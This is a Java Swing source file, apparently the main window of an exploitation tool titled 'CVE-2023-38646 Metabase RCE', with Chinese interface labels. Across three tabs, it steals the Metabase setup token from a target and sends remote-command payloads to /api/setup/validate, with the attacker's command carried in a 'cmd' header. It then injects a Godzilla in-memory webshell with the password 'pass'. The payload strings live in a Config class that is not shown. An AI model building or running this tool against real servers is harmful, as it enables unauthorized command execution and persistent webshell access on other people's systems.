package com.boogipop.console;

import java.awt.event.*;

import com.boogipop.console.template.Config;
import com.boogipop.console.util.HttpUtils;
import com.boogipop.console.util.TokenUtil;
import com.formdev.flatlaf.FlatDarkLaf;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.net.MalformedURLException;
import java.net.URL;

/**
 * @author Boogipop
 */
public class Main extends JFrame {
    public Main() {
        initComponents();
    }

    private void Path(ActionEvent e) {
        // TODO add your code here
    }

    private void PocButton(ActionEvent e)  {
        // TODO add your code here
        String target = Path.getText();
        URL url = null;
        try {
            url = new URL(target);
        } catch (MalformedURLException ex) {
            throw new RuntimeException(ex);
        }
        String host = url.getHost();
        String protocol = url.getProtocol();
        int port = url.getPort();
        String des="";
        if(port!=-1){
            des=protocol+"://"+host+":"+port+"/api/session/properties";
        }
        else {
            des=protocol+"://"+host+":"+"/api/session/properties";
        }
        try {
            String token = TokenUtil.GetToken(des,protocol);
            boolean vul = TokenUtil.IsVul(token);
            if (vul) {
                Config.flag = true;
                Config.token = token;
                Output.setText(Config.banner);
                Output.append(String.format("[*]!目标存在未授权漏洞 Setup-Token: %s\n[*]请前往内存马和命令执行模块执行命令!", token));
            } else {
                Config.flag = false;
                Output.setText("[*]目标不存在漏洞 GiveUp");
            }
        }
        catch (Exception exception){
            Output.setText("[*]目标不存在漏洞 GiveUp");
        }
    }


    private void OutputMouseClicked(MouseEvent e) {
        // TODO add your code here
        if (SwingUtilities.isRightMouseButton(e)) {
            ClearMenu.show(OutputPanel, e.getX(), e.getY());
        }
    }

    private void ClearItem(ActionEvent e) {
        // TODO add your code here
        Output.setText("");
    }

    private void Rce(ActionEvent e) {
        // TODO add your code here
        String target = Path2.getText();
        String jarlocationText = Jarlocation.getText();
        if(!jarlocationText.equals("")) {
            Config.jarlocation = jarlocationText;
        }
        else {
            Config.jarlocation="./metabase.jar";
        }
        URL url = null;
        try {
            url = new URL(target);
        } catch (MalformedURLException ex) {
            throw new RuntimeException(ex);
        }
        String host = url.getHost();
        String protocol = url.getProtocol();
        int port = url.getPort();
        String des="";
        if(port!=-1) {
            des = protocol + "://" + host + ":" + port + "/api/setup/validate";
        }
        else{
            des = protocol + "://" + host + ":" + "/api/setup/validate";
        }
        if(Config.flag) {
            String cmd = Command.getText();
            HttpUtils.customHeaders.put("cmd", cmd);
            String cmdPayload = Config.getCmdPayload();
            try {
                if(protocol.equals("http")) {
                    String res = HttpUtils.sendJsonPostRequestWithHeaders(des, cmdPayload, HttpUtils.customHeaders);
                    Output.setText(String.format("[*]Success: %s", res));
                    Config.Injectflag=true;
                }
                else {
                    String res = HttpUtils.sendHttpsJsonPostRequestWithHeaders(des, cmdPayload, HttpUtils.customHeaders);
                    Output.setText(String.format("[*]Success: %s", res));
                    Config.Injectflag=true;
                }
            }
            catch (Exception error){
                Output.setText(String.format("[*]RceFailed: %s", error));
            }
        }
        else {
            Output.setText("[*]请先执行验证模块");
        }
    }

    private void Memshell(ActionEvent e) {
        // TODO add your code here
        String target = Path3.getText();
        URL url = null;
        try {
            url = new URL(target);
        } catch (MalformedURLException ex) {
            throw new RuntimeException(ex);
        }
        String host = url.getHost();
        String protocol = url.getProtocol();
        int port = url.getPort();
        String des="";
        if(port!=-1) {
            des = protocol + "://" + host + ":" + port + "/api/setup/validate";
        }
        else{
            des = protocol + "://" + host + ":" + "/api/setup/validate";
        }
        if(Config.Injectflag) {
            String cmdPayload = Config.getGozillaPayload();
            try {
                if(protocol.equals("http")) {
                    String res = HttpUtils.sendJsonPostRequestWithHeaders(des, cmdPayload, HttpUtils.customHeaders);
                }
                else {
                    String res = HttpUtils.sendHttpsJsonPostRequestWithHeaders(des, cmdPayload, HttpUtils.customHeaders);
                }
            }
            catch (Exception error){
                Output.setText(Config.banner);
                Output.append(String.format("[*]Complete: %s", "Inject Completely\n"));
                Output.append("password: pass\n");
                Output.append("请自行哥斯拉连接测试\n");
            }
        }
        else {
            Output.setText("[*]请先执行命令执行模块");
        }
    }

    private void initComponents() {
        // JFormDesigner - Component initialization - DO NOT MODIFY  //GEN-BEGIN:initComponents  @formatter:off
        OutputPanel = new JScrollPane();
        Output = new JTextArea();
        Tab = new JTabbedPane();
        PocPanel = new JPanel();
        TargetPath = new JLabel();
        Path = new JTextField();
        PocButton = new JButton();
        Author = new JLabel();
        CMDPanel = new JPanel();
        TargetPath2 = new JLabel();
        Path2 = new JTextField();
        RceButton = new JButton();
        TargetPath4 = new JLabel();
        Command = new JTextField();
        JarlocationLabel = new JLabel();
        Jarlocation = new JTextField();
        MemshellPanel = new JPanel();
        TargetPath3 = new JLabel();
        Path3 = new JTextField();
        MemshellButton = new JButton();
        Mention = new JLabel();
        ClearMenu = new JPopupMenu();
        ClearItem = new JMenuItem();

        //======== this ========
        setTitle("CVE-2023-38646 Metabase RCE");
        Container contentPane = getContentPane();
        contentPane.setLayout(null);

        //======== OutputPanel ========
        {

            //---- Output ----
            Output.addMouseListener(new MouseAdapter() {
                @Override
                public void mouseClicked(MouseEvent e) {
                    OutputMouseClicked(e);
                }
            });
            OutputPanel.setViewportView(Output);
        }
        contentPane.add(OutputPanel);
        OutputPanel.setBounds(0, 160, 645, 325);

        //======== Tab ========
        {

            //======== PocPanel ========
            {
                PocPanel.setLayout(null);

                //---- TargetPath ----
                TargetPath.setText("\u76ee\u6807\u5730\u5740");
                PocPanel.add(TargetPath);
                TargetPath.setBounds(5, 10, 70, 27);
                PocPanel.add(Path);
                Path.setBounds(70, 10, 560, 30);

                //---- PocButton ----
                PocButton.setText("\u5f00\u59cb\u9a8c\u8bc1");
                PocButton.addActionListener(e -> PocButton(e));
                PocPanel.add(PocButton);
                PocButton.setBounds(445, 50, 115, 25);

                //---- Author ----
                Author.setText("Author: Boogipop");
                PocPanel.add(Author);
                Author.setBounds(5, 50, 205, 30);

                {
                    // compute preferred size
                    Dimension preferredSize = new Dimension();
                    for(int i = 0; i < PocPanel.getComponentCount(); i++) {
                        Rectangle bounds = PocPanel.getComponent(i).getBounds();
                        preferredSize.width = Math.max(bounds.x + bounds.width, preferredSize.width);
                        preferredSize.height = Math.max(bounds.y + bounds.height, preferredSize.height);
                    }
                    Insets insets = PocPanel.getInsets();
                    preferredSize.width += insets.right;
                    preferredSize.height += insets.bottom;
                    PocPanel.setMinimumSize(preferredSize);
                    PocPanel.setPreferredSize(preferredSize);
                }
            }
            Tab.addTab("\u9a8c\u8bc1\u6a21\u5757", PocPanel);

            //======== CMDPanel ========
            {
                CMDPanel.setLayout(null);

                //---- TargetPath2 ----
                TargetPath2.setText("\u76ee\u6807\u5730\u5740");
                CMDPanel.add(TargetPath2);
                TargetPath2.setBounds(5, 10, 70, 27);
                CMDPanel.add(Path2);
                Path2.setBounds(70, 10, 520, 30);

                //---- RceButton ----
                RceButton.setText("\u6267\u884c\u547d\u4ee4");
                RceButton.addActionListener(e -> Rce(e));
                CMDPanel.add(RceButton);
                RceButton.setBounds(445, 50, 115, 25);

                //---- TargetPath4 ----
                TargetPath4.setText("\u6267\u884c\u547d\u4ee4");
                CMDPanel.add(TargetPath4);
                TargetPath4.setBounds(5, 50, 110, 27);
                CMDPanel.add(Command);
                Command.setBounds(70, 50, 215, 30);

                //---- JarlocationLabel ----
                JarlocationLabel.setText("JarLocation");
                CMDPanel.add(JarlocationLabel);
                JarlocationLabel.setBounds(5, 90, 110, 27);

                //---- Jarlocation ----
                Jarlocation.setText("./metabase.jar");
                CMDPanel.add(Jarlocation);
                Jarlocation.setBounds(85, 90, 200, 30);

                {
                    // compute preferred size
                    Dimension preferredSize = new Dimension();
                    for(int i = 0; i < CMDPanel.getComponentCount(); i++) {
                        Rectangle bounds = CMDPanel.getComponent(i).getBounds();
                        preferredSize.width = Math.max(bounds.x + bounds.width, preferredSize.width);
                        preferredSize.height = Math.max(bounds.y + bounds.height, preferredSize.height);
                    }
                    Insets insets = CMDPanel.getInsets();
                    preferredSize.width += insets.right;
                    preferredSize.height += insets.bottom;
                    CMDPanel.setMinimumSize(preferredSize);
                    CMDPanel.setPreferredSize(preferredSize);
                }
            }
            Tab.addTab("\u547d\u4ee4\u6267\u884c", CMDPanel);

            //======== MemshellPanel ========
            {
                MemshellPanel.setLayout(null);

                //---- TargetPath3 ----
                TargetPath3.setText("\u76ee\u6807\u5730\u5740");
                MemshellPanel.add(TargetPath3);
                TargetPath3.setBounds(5, 10, 70, 27);
                MemshellPanel.add(Path3);
                Path3.setBounds(70, 10, 520, 30);

                //---- MemshellButton ----
                MemshellButton.setText("\u6ce8\u5165\u5185\u5b58\u9a6c");
                MemshellButton.addActionListener(e -> Memshell(e));
                MemshellPanel.add(MemshellButton);
                MemshellButton.setBounds(445, 50, 115, 25);

                //---- Mention ----
                Mention.setText("PS:\u76ee\u524d\u4ec5\u652f\u6301Godzilla,\u6ce8\u5165\u5185\u5b58\u9a6c\u524d\u8bf7\u5728\u547d\u4ee4\u6267\u884c\u6a21\u5757\u6307\u5b9aJarLocation");
                MemshellPanel.add(Mention);
                Mention.setBounds(5, 75, 565, Mention.getPreferredSize().height);

                {
                    // compute preferred size
                    Dimension preferredSize = new Dimension();
                    for(int i = 0; i < MemshellPanel.getComponentCount(); i++) {
                        Rectangle bounds = MemshellPanel.getComponent(i).getBounds();
                        preferredSize.width = Math.max(bounds.x + bounds.width, preferredSize.width);
                        preferredSize.height = Math.max(bounds.y + bounds.height, preferredSize.height);
                    }
                    Insets insets = MemshellPanel.getInsets();
                    preferredSize.width += insets.right;
                    preferredSize.height += insets.bottom;
                    MemshellPanel.setMinimumSize(preferredSize);
                    MemshellPanel.setPreferredSize(preferredSize);
                }
            }
            Tab.addTab("\u5185\u5b58\u9a6c\u6ce8\u5165", MemshellPanel);
        }
        contentPane.add(Tab);
        Tab.setBounds(5, 0, 645, Tab.getPreferredSize().height);

        {
            // compute preferred size
            Dimension preferredSize = new Dimension();
            for(int i = 0; i < contentPane.getComponentCount(); i++) {
                Rectangle bounds = contentPane.getComponent(i).getBounds();
                preferredSize.width = Math.max(bounds.x + bounds.width, preferredSize.width);
                preferredSize.height = Math.max(bounds.y + bounds.height, preferredSize.height);
            }
            Insets insets = contentPane.getInsets();
            preferredSize.width += insets.right;
            preferredSize.height += insets.bottom;
            contentPane.setMinimumSize(preferredSize);
            contentPane.setPreferredSize(preferredSize);
        }
        pack();
        setLocationRelativeTo(getOwner());

        //======== ClearMenu ========
        {

            //---- ClearItem ----
            ClearItem.setText("\u6e05\u9664\u7a97\u53e3");
            ClearItem.addActionListener(e -> ClearItem(e));
            ClearMenu.add(ClearItem);
        }
        // JFormDesigner - End of component initialization  //GEN-END:initComponents  @formatter:on
    }

    // JFormDesigner - Variables declaration - DO NOT MODIFY  //GEN-BEGIN:variables  @formatter:off
    private JScrollPane OutputPanel;
    private JTextArea Output;
    private JTabbedPane Tab;
    private JPanel PocPanel;
    private JLabel TargetPath;
    private JTextField Path;
    private JButton PocButton;
    private JLabel Author;
    private JPanel CMDPanel;
    private JLabel TargetPath2;
    private JTextField Path2;
    private JButton RceButton;
    private JLabel TargetPath4;
    private JTextField Command;
    private JLabel JarlocationLabel;
    private JTextField Jarlocation;
    private JPanel MemshellPanel;
    private JLabel TargetPath3;
    private JTextField Path3;
    private JButton MemshellButton;
    private JLabel Mention;
    private JPopupMenu ClearMenu;
    private JMenuItem ClearItem;
    // JFormDesigner - End of variables declaration  //GEN-END:variables  @formatter:on
    public static void main(String[] args) {
        FlatDarkLaf.install();
        Main main = new Main();
        main.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        main.pack();
        main.setIconImage(new ImageIcon("src/main/resources/image/icon.jpg").getImage());
        main.setVisible(true);
    }
}
